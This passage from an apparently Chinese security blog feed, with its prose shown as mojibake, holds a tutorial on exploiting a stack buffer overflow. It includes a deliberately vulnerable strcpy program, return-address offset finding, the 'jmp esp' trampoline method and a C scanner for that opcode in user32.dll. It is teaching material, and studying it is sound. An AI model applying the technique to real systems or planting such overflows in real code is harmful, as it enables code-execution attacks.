ˆçš„æƒ…å†µï¼š</p><p>æˆ‘ä»¬è·³è½¬åˆ°espå¤„ï¼ˆåœ¨æ•°æ®åŒºåŸŸ, <code>ctrl+G</code>, è¾“å…¥ <code>esp</code>ï¼‰ï¼ŒæŸ¥çœ‹æ ˆåŒºåŸŸçš„æ•°æ®:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160811255.png" alt="image-20200118160811255"></p><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><ul><li><a href="https://blog.csdn.net/ioio_jy/article/details/48316111">https://blog.csdn.net/ioio_jy/article/details/48316111</a> </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åˆ‡å…¥æ­£é¢˜ï¼Œè¿™æ¬¡æˆ‘ä»¬è¿›è¡Œshellcodeç¼–å†™ï¼Œåªæ˜¯åŸºç¡€çš„ç¼–å†™ï¼Œä¸ä¼šæ¶‰åŠçš„å¤ªå¤æ‚ï¼Œæˆ‘ä»¬è¿™æ¬¡ç¼–å†™çš„shellcodeå°±æ˜¯è®©ç¨‹åºè‡ªåŠ¨å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„cè¯­è¨€ä¸­çš„&lt;code&gt;MessageBox()&lt;/code&gt;è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œç¼–å†™ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆéœ€è¦åšçš„å°±æ˜¯è·å–</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="æº¢å‡ºæ”»å‡»" scheme="https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>ç¼“å†²åŒºæº¢å‡ºçš„åˆ©ç”¨(äºŒ)</title>
    <link href="https://taonn.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8-%E4%BA%8C/"/>
    <id>https://taonn.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8-%E4%BA%8C/</id>
    <published>2020-10-06T00:28:44.000Z</published>
    <updated>2021-03-16T05:28:15.096Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘ä»¬è¿™æ¬¡çš„ç¯å¢ƒè·Ÿä¸Šä¸€ç¯‡ä¸€æ ·ï¼Œä¸Šä¸€ç¯‡åªæ˜¯åˆ†æäº†å‘ç”Ÿçš„åŸå› ï¼Œè¿™ä¸€ç¯‡æˆ‘ä»¬å°±å¯¹äº§ç”Ÿç¼“å†²åŒºæº¢å‡ºè¿›è¡Œåˆ©ç”¨ï¼Œè¿˜æ˜¯ä¹‹å‰é‚£ä¸¤ä¸ªç¨‹åº<code>test1.exe</code> and <code>test2.exe</code>çš„åŸºç¡€ä¸Šè¿›è¡Œè®²è§£ï¼Œæ‰€ä»¥ä¸Šä¸€ç¯‡ä¸€å®šè¦ç†è§£ï¼ï¼ï¼</p><p>ç¼“å†²åŒºæº¢å‡ºç¨‹åºï¼Œ<code>test2.exe</code>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betaobetaobetao&quot;</span>;  <span class="comment">//å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼ æ³¨æ„ï¼Œè¿™é‡Œå¤šäº†ä¸¤ä¸ªbetao</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//è¿”å›å€¼ ä¸»å‡½æ•°main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//å¼€è¾Ÿ8ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//è¾“å‡º</span></span><br><span class="line">    getchar();               <span class="comment">//æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  è¿™é‡Œæˆ‘ä»¬éœ€è¦åˆ†æˆå‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li><p><strong>1.ç²¾ç¡®å®šä½è¿”å›åœ°å€çš„ä½ç½®</strong></p></li><li><p><strong>2.å¯»æ‰¾è¦†ç›–åŸå§‹è¿”å›åœ°å€çš„åœ°å€</strong></p></li><li><p><strong>3.ç¼–å†™shellcodeåˆ°ç›¸åº”çš„ç¼“å†²åŒº</strong>(è¿™ä¸€æ­¥ä¼šæ¶‰åŠå¾ˆå¤šä¸œè¥¿ï¼Œæ±‡ç¼–è¯­è¨€ç­‰ï¼Œæ‰€ä»¥ä¸‹ä¸€ç¯‡è¯´)</p><p>ç»è¿‡ä¸Šä¸€ç¯‡ï¼Œè¡¥å……å†…å®¹ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ç¨‹åºæŠ¥é”™çš„æ˜¾ç¤ºï¼Œå¾ˆå¿«çš„æ‰¾åˆ°äº†<code>Address</code>,æŠ¥é”™åœ°å€æ˜¯<code>0x006f6174</code>,æˆ‘ä»¬é€šè¿‡æŠŠåå…­è¿›åˆ¶è½¬æ¢æˆASCIIç ï¼š</p></li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221102439540.png" alt="image-20191221102439540"></p><pre><code>  è¿™é‡Œçš„`tao`æ­£å¥½æ˜¯æˆ‘ä»¬è¾“å…¥é‚£ä¸€ä¸²é•¿å­—ç¬¦çš„æœ€åä¸‰ä¸ªå­—æ¯ï¼Œç”±äºåœ°å€æ˜¯4ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¦‚æœæˆ‘å°†å…¨å±€å˜é‡`name`èµ‹å€¼ä¸º`betaobetaobeXXXX`é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå››ä¸ª`X`å°±æ˜¯æˆ‘ä»¬è¦†ç›–çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬ä¸Šæ¬¡ä¹Ÿè¯´äº†ï¼Œ`buffer`å˜é‡åªæœ‰8ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œåé¢å››ä¸ªå­—èŠ‚`aobe`æ˜¯çˆ¶å‡½æ•°EBPçš„åœ°å€ï¼Œåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬ä¹Ÿå°±è§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜----&gt;   **ç²¾ç¡®å®šä½è¿”å›åœ°å€çš„ä½ç½®**ã€‚</code></pre><p>â€‹    è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬è¿™ä¸ªç¨‹åºçš„å±€éƒ¨å˜é‡<code>buffer</code>åªæœ‰8ä¸ªå­—èŠ‚ï¼Œå› æ­¤å¾ˆå®¹æ˜“å°±èƒ½å¤Ÿè¢«å¡«å……æ»¡ï¼Œä»è€Œå¾ˆå®¹æ˜“å°±èƒ½å¤Ÿè¢«å®šä½ï¼Œä½†æ˜¯å¦‚æœç¼“å†²åŒºç©ºé—´å¾ˆå¤§ï¼Œè¯¥å¦‚ä½•å®šä½å‘¢ï¼Ÿæ€»ä¸èƒ½è¿˜æ˜¯é‡å¤<code>betaobetaobetao...</code>å§ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨26ä¸ªå¤§å†™å­—ç¬¦ä¸å°å†™å­—ç¬¦ï¼Œä¸€å…±52ä¸ªå­—ç¬¦è¿›è¡Œæµ‹è¯•ï¼Œä¸€æ¬¡å°±å¯ä»¥éªŒè¯52ä¸ªå­—èŠ‚çš„ç¼“å†²åŒºç©ºé—´ã€‚</p><p>â€‹    æˆ‘ä»¬è¿™é‡Œä¿®æ”¹å±€éƒ¨å˜é‡æ•°ç»„å¤§å°ä¸º80,æˆ‘ä»¬åŠ ä¸¤ç«¯è‹±æ–‡å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯104ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>;  <span class="comment">//å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//è¿”å›å€¼ ä¸»å‡½æ•°main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">80</span>];   <span class="comment">//å¼€è¾Ÿ80ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name ï¼ï¼ï¼</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//è¾“å‡º</span></span><br><span class="line">    getchar();               <span class="comment">//æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> å°†ä»¥ä¸ŠCä»£ç ç¨‹åºç¼–è¯‘â€¦,ç„¶åè¿è¡Œ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221104145203.png" alt="image-20191221104145203"></p><p>â€‹    åœ¨Addressåå¯ä»¥å‘ç°ï¼Œå…¶å€¼ä¸º0x6a696867ï¼Œæ³¨æ„æˆ‘ä»¬çš„ç³»ç»Ÿæ˜¯<strong>å°ç«¯æ˜¾ç¤º</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®é™…çš„å­—ç¬¦åº”è¯¥æ˜¯0x67ã€0x68ã€0x69ã€0x6aã€‚é‚£ä¹ˆæŠŠå®ƒè½¬æ¢æˆå­—æ¯ï¼Œå¯ä»¥çŸ¥é“æ˜¯gã€hã€iã€j  </p><p>é€šè¿‡pythonè½¬æ¢æˆASCIIç ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221104444316.png" alt="image-20191221104444316"></p><p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆæ˜¯<code>ghij</code>,çœ‹ä¸‹å›¾</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221105144039.png" alt="image-20191221105144039"></p><p>ok,æˆ‘ä»¬å›åˆ°æˆ‘ä»¬ç®€å•çš„ç¨‹åº</p><p>â€‹    ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç¡®å®š<code>betaobetaobeXXXX</code>ä¸­çš„æœ€åå››ä¸ªâ€œXâ€åº”è¯¥æ˜¯ä»€ä¹ˆåœ°å€ã€‚è¿™é‡Œæˆ‘ä»¬ä¸èƒ½å‡­ç©ºåˆ›é€ ä¸€ä¸ªåœ°å€ï¼Œè€Œæ˜¯åº”è¯¥åŸºäºä¸€ä¸ªåˆæ³•åœ°å€çš„åŸºç¡€ä¹‹ä¸Šã€‚å½“ç„¶æˆ‘ä»¬é€šè¿‡åœ¨ODä¸­çš„è§‚å¯Ÿï¼Œç¡®å®èƒ½å¤Ÿæ‰¾åˆ°å¾ˆå¤šåˆé€‚çš„åœ°å€ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•ä¸å…·æœ‰é€šç”¨æ€§ï¼Œæ¯•ç«Ÿè¦æ‰¾ä¸€ä¸ªç¡®åˆ‡çš„åœ°å€è¿˜æ˜¯ä¸é‚£ä¹ˆæ–¹ä¾¿çš„ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œä½†æ˜¯æœ€ä¸ºå¸¸ç”¨æœ€ä¸ºç»å…¸çš„ï¼Œå°±æ˜¯<code>jmp esp</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨è·³æ¿è¿›è¡Œè·³è½¬ã€‚</p><p>â€‹    è¿™é‡Œçš„è·³æ¿æ˜¯ç¨‹åºä¸­åŸæœ‰çš„æœºå™¨ä»£ç ï¼Œå®ƒä»¬éƒ½æ˜¯èƒ½å¤Ÿè·³è½¬åˆ°ä¸€ä¸ªå¯„å­˜å™¨å†…æ‰€å­˜æ”¾çš„åœ°å€è¿›è¡Œæ‰§è¡Œï¼Œå¦‚<code>jmp esp</code>ã€<code>call esp</code>ã€<code>jmp ecx</code>ã€<code>call eax</code>ç­‰ç­‰ã€‚å¦‚æœåœ¨å‡½æ•°è¿”å›çš„æ—¶å€™ï¼ŒCPUå†…å¯„å­˜å™¨åˆšå¥½ç›´æ¥æˆ–è€…é—´æ¥æŒ‡å‘ShellCodeçš„å¼€å¤´ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠå¯¹æ ˆå†…å­˜æ”¾çš„è¿”å›åœ°å€çš„é‚£ä¸€ä¸ªå…ƒç´ è¦†ç›–ä¸ºç›¸åº”çš„è·³æ¿åœ°å€ã€‚</p><p>â€‹    æˆ‘ä»¬ç”»å›¾æ¥ç†è§£ä¸€ä¸‹ï¼Œä¸Šé¢çš„è¯æ˜¯ä»€ä¹ˆæ„æ€.</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221110334737.png" alt="image-20191221110334737"></p><p>æˆ‘ä»¬ä¹Ÿç”¨ODè½½å…¥ä¸Šä¸€ç¯‡ä¸­çš„<code>test1.exe</code>ï¼Œæ¥å…·ä½“åˆ†æä¸€ä¸‹ï¼Œä¸Šé¢è¯´çš„ä»€ä¹ˆæ„æ€ï¼</p><p>æˆ‘ä»¬ç›´æ¥æ‰§è¡Œåˆ°mianå‡½æ•°æœ€åä¸€ä¸ªåœ°å€ï¼Œç„¶åF8ä¸€æ­¥æ­¥æ‰§è¡Œåˆ°<code>0x4010a6</code>åœ°å€ä¸­, å³retnè¯­å¥å¤„ï¼Œæ­¤æ—¶æˆ‘ä»¬å…³æ³¨ä¸€ä¸‹espå¯„å­˜å™¨æ‰€ä¿å­˜çš„å€¼ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221111335755.png" alt="image-20191221111335755"></p><p>å…³æ³¨æˆ‘æ ‡ç®­å¤´çš„å‡ ä¸ªä½ç½®ï¼Œæˆ‘ä»¬ç»§ç»­æ‰§è¡Œï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221111542971.png" alt="image-20191221111542971"></p><p>ä¸»è¦å…³æ³¨espçš„å€¼ã€‚å¯ä»¥å‘ç°ï¼Œespçš„å€¼ç”±åˆšæ‰çš„<code>0x0012FF84</code>å˜æˆäº†<code>0x0012FF88</code>ï¼Œä»æ ˆç©ºé—´æ¥çœ‹ï¼Œå³åˆšæ‰é‚£ä¸ªå€¼çš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚ä¸è¦å¿˜äº†ï¼Œ<code>0x0012FF84</code>ä½ç½®æ­£å¼æˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„è¿”å›åœ°å€çš„ä½ç½®ã€‚</p><p>â€‹    æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œå½“mainå‡½æ•°æ‰§è¡Œå®Œæ¯•çš„æ—¶å€™ï¼Œespçš„å€¼ä¼šè‡ªåŠ¨å˜æˆè¿”å›åœ°å€çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œè€Œespçš„è¿™ç§å˜åŒ–ï¼Œä¸€èˆ¬æ˜¯ä¸å—ä»»ä½•æƒ…å†µå½±å“çš„ã€‚æ—¢ç„¶æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸€ä¸ªç‰¹æ€§ï¼Œé‚£ä¹ˆå…¶å®å°±å¯ä»¥å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºespæ‰€ä¿å­˜çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥è®©ç¨‹åºè·³è½¬åˆ°espæ‰€ä¿å­˜çš„åœ°å€ä¸­ï¼Œå»æ‰§è¡Œæˆ‘ä»¬æ‰€æ„é€ çš„æŒ‡ä»¤ï¼Œä»¥ä¾¿è®©è®¡ç®—æœºæ‰§è¡Œã€‚</p><p>â€‹         å½“ç„¶äº†ï¼Œä»¥ä¸Šæˆ‘æ‰€è®²çš„æ˜¯æ­£å¸¸çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¿”å›åœ°å€æ²¡æœ‰è¢«ç ´åçš„æƒ…å†µï¼Œé‚£ä¹ˆå¦‚æœè¿”å›åœ°å€è¢«ç ´åäº†ï¼Œespè¿˜å…·å¤‡è¿™ç§ç‰¹æ€§å—ï¼Ÿä¸å¦¨å†ç”¨ODè½½å…¥<code>test4.exe</code>è¿™ä¸ªå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºé—®é¢˜çš„ç¨‹åºï¼Œæ¥ç ”ç©¶ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰çš„å­—ç¬¦é•¿åº¦,æ²¡åŠæ³•è¦†ç›–åˆ°shellcodeéƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ é•¿å­—ç¬¦ï¼Œcä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betaobetaobetaobetaobetao&quot;</span>;  <span class="comment">//å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//è¿”å›å€¼ ä¸»å‡½æ•°main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//å¼€è¾Ÿ80ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name ï¼ï¼ï¼</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//è¾“å‡º</span></span><br><span class="line">    getchar();               <span class="comment">//æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯å…ˆæ¥åˆ°mainå‡½æ•°çš„retnçš„ä½ç½®ï¼š  </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221112251752.png" alt="image-20191221112251752"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221112542641.png" alt="image-20191221112542641"></p><p>åˆ°è¿™é‡Œæˆ‘ä»¬å°±åº”è¯¥çŸ¥é“ï¼Œä¸ºä»€ä¹ˆè¦è·³è½¬äº†å§ï¼Ÿï¼Ÿï¼Ÿé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥è¦è§£å†³çš„å°±æ˜¯ï¼Œå¦‚æœè®©ç¨‹åºè·³è½¬åˆ° espçš„ä½ç½®å‘¢ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ<code>jmp esp</code> è¿™æ¡æŒ‡ä»¤ ,<code>jmp esp</code>æŒ‡ä»¤å¯¹åº”çš„æœºå™¨ç æ˜¯<code>0xFFE4</code>  </p><p>æˆ‘ä»¬æ¥ä¸‹æ¥ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ¥åœ¨<code>user32.dll</code>è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­å¯»æ‰¾<code>jmp esp</code>è¿™ä¸ªæœºå™¨æŒ‡ä»¤çš„å†…å­˜åœ°å€ï¼ˆ<code>jmp esp</code>å¾ˆå¤šåŠ¨æ€é“¾æ¥åº“éƒ½æœ‰ï¼Œè¿™é‡Œåªæ˜¯åšä¸€ä¸ªä¾‹å­ï¼‰ï¼š</p><p>Cä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_NAME <span class="meta-string">&quot;user32.dll&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BYTE* ptr;</span><br><span class="line">    <span class="keyword">int</span> position,address;</span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    BOOL done_flag = FALSE;</span><br><span class="line">    handle=LoadLibrary(DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>(!handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; load dll erro !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = (BYTE*)handle;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(position = <span class="number">0</span>; !done_flag; position++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>] == <span class="number">0xE4</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//0xFFE4 is the opcode of jmp esp</span></span><br><span class="line">                <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(...)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;END OF 0x%x\n&quot;</span>, address);</span><br><span class="line">            done_flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221144508319.png" alt="image-20191221144508319"></p><p>æ³¨ï¼šç¼–è¯‘è¿è¡Œï¼Œæ–‡ä»¶åå¿…é¡»æ˜¯<code>.cpp</code>åç¼€ï¼Œä¸èƒ½<code>.c</code></p><p>ç”±ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œåœ°å€éå¸¸å¤šï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨å€’æ•°ç¬¬äºŒè¡Œ<code>0x77e35b79</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘éœ€è¦ä½¿ç”¨è¿™ä¸ªåœ°å€æ¥è¦†ç›–ç¨‹åºçš„è¿”å›åœ°å€ã€‚è¿™æ ·ï¼Œç¨‹åºåœ¨è¿”å›æ—¶ï¼Œå°±ä¼šæ‰§è¡Œjmp espï¼Œä»è€Œè·³åˆ°è¿”å›åœ°å€ä¸‹ä¸€ä¸ªä½ç½®å»æ‰§è¡Œè¯¥åœ°å€å¤„çš„è¯­å¥ã€‚  </p><p>â€‹    è¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹ï¼šæœ‰å¾ˆå¤šç§æ–¹æ³•å¯ä»¥è·å–jmp espï¼Œè€Œä¸”ä¸åŒçš„ç³»ç»Ÿè¿™ä¸ªåœ°å€å¯èƒ½æ˜¯ä¸åŒçš„ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221144833652.png" alt="image-20191221144833652"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œåœ°å€çš„éªŒè¯ã€‚æˆ‘ä»¬éšä¾¿é™„åŠ ä¸€ä¸ªè¿›ç¨‹å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221145211651.png" alt="image-20191221145211651"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>â€‹    